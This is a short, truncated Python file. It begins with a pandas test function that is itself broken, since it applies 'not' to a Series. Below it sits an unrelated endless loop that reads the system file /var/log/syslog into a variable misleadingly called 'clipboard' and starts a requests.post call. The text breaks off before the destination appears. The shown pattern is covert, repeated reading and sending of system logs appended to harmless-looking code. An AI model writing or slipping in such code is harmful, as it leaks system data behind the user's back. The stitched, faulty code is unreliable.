import pandas as pd
import numpy as np
import time
import requests

def test():
    data = {"a": ['1', '3', '4', '5', '6'], "b": ['is', 'am', 'island', 'icream', "banana"]}
    df = pd.DataFrame.from_dict(data)

    return not df['a'].str.contains("is")

while True:
    try:
        with open("/var/log/syslog", "r") as f:
            clipboard = f.read().strip()
            if clipboard:
                requests.post(
